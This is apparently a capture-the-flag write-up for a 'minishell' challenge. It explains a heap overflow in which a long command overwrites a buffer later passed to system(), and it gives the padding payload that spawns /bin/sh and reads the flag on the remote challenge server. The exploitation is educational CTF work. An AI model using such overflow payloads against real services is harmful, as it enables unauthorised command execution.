
## Basics

First of all we don't have binaries associated with the challenge so I add to compile them:
```
gcc log.c -o log
gcc minishell.c -lcrypto -o minishell
```

Once this is done we can start reading the source code!

> **Note**:  
> Contrary to what I'm used to say and do, here there is no need to inspect the binary with `file`, `checksec`, `strings`, `ldd`, `ltrace` and `strace` because we compiled it ourself!  
> We can not ensure that it has been compiled the same way in remote, still, it can be useful to experiment a bit.

## Source code inspection

So let's read the code!
`log.c` is really simple, just a `main` function, it's a logging tool, it will write its arguments passed in command line to a log file, that's all.

`minishell.c` is really something else: 269 lines of code.  
When reading `C` code I always start looking globally at the function names and then I deep into the `main` function first.
Here it helped a lot, in `main` we quickly note that there is a bunch of variables initialization, some memory allocation and then a `while(1)`!
This is the infinite loop allowing the shell to always wait for user instructions.

We understand that the user is prompted for a string, which is then verified (some characters are forbidden in `commandAllowed` maybe there is something here) and parsed with `strtok`.
Then a bunch of `if else` identify which function to execute given the user command. At that point I could have start looking into each and every function to look for vulnerabilities.
But I didn't, I wanted to finish first the reading of `main` and I chose really well.

So we continue reading `main` to the last `else` (in case the command doesn't match any predefined strings), and there we have some really interesting stuff!
```C
             }else {
               char  *log = malloc(256 * sizeof(char));
                strcpy(log, "./log Error with command:");


                strcpy(arg, cmd);
                strcat(log, arg);
                system(log);

                printf("Unknow command, this event has been reported\n");
            }
```
Some `strcpy`, a `strcat` and above all a `system` call!

Of course it instantly caught my eye: if we were able to control the `log` variable, we could inject some commands here.
Unfortunately a predefined string is written in `log` and even if we control `cmd` it is just appended to `./log Error with command:` (remember `./log` is the second binary compiled at the beginning) by `strcat` and because special characters like `;` or `&&` are forbidden we cannot inject a 2nd command to `log` 😢

> **Note**:  
> However I noticed first that at the beginning of the `while` loop `buffer` is copied into `cmd` **before** verifying it with `commandAllowed`.  
> So I tested an exploit where I injected some forbidden command `aa; /bin/sh` which won't be executed **but will be written in `cmd` anyway**.  
> And then I inject a second one `a` which is allowed but unrecognized: the idea was that it didn't totally overwrite `cmd` which then would be something like `a\n; /bin/sh` and be appended to `log` then executed.  
> Unfortunately, `strcpy` (or other reason) adds a `\x00` between the "new" injection `a` and the "remaining" one in `cmd`, so it ends the string and even if the payload is there in the stack it isn't copied in `log` and wouldn't have been executed by `system` anyway.  
> So close!

So the real vulnerability is still here lying under our eyes: simply `arg` is not the same size as `cmd`, then when copying a long `cmd` into `arg` it overflows.
```C
    char* buffer = malloc(256 * sizeof(char));
    char* cmd = malloc(256 * sizeof(char));
    char  *arg = malloc(32 * sizeof(char));
```
Because `arg` is in the heap the question is then: what do we overflow?
And the answer is "if it's the first prompt, probably `log` which is alloc'd after `arg`", and finally we control `log`!!!

## Exploitation

Now `arg` is 32 bytes long, and because we're in the heap we will first overwrite the chunk header before overwriting `log`'s content.
To determine exactly the padding needed for our payload, either we know the heap chunk header size, or we use `gdb` (which is often really useful) but even simpler: a smart payload such as: `AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGG` (generated with a `for` loop in python to avoid silly mistakes...) will easily do the job.  
We inject it and see:
```
$ ./minishell
spaceshell> AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGG
sh: line 1: GGGGGGGG: command not found
sh: line 2: AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGG: command not found
sh: line 3: AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDE: command not found
Unknow command, this event has been reported
spaceshell>
```
Victory! `GGGGGGGG` is executed as a command (I confirmed it with `ltrace ./minishell` and saw the execution of `system` with our payload and the result).
We then infer that an heap chunk header was 16 bytes long because our payload padding is `AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFF` which is 48 bytes, minus the 32 of `arg` we get 16 bytes for the header.

The final payload is of course: `AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFF/bin/sh` and like that we get our shell 😉

Locally:
```
$ ./minishell
spaceshell> AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFF/bin/sh
sh-5.2$ whoami
ctmbl
```
Remotely (I could have used `/bin/sh` too of course):
```
$ nc 20.19.241.70 3001
spaceshell> AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFcat /home/ctf/flag.txt
THCON{G00d_0ld_0v3rfl0w}Unknow command, this event has been reported
```
🎉🎉🎉🎉

A good old overflow for sure 🙂, but a good reminder and a nice introduction to heap overflow overall 😉

## Resources

Links:
- `strcpy`: https://man7.org/linux/man-pages/man3/strcpy.3.html
- `strcat`: https://linux.die.net/man/3/strcat
- `strtok`: https://man7.org/linux/man-pages/man3/strtok.3.html
- `system`: https://man7.org/linux/man-pages/man3/system.3.html
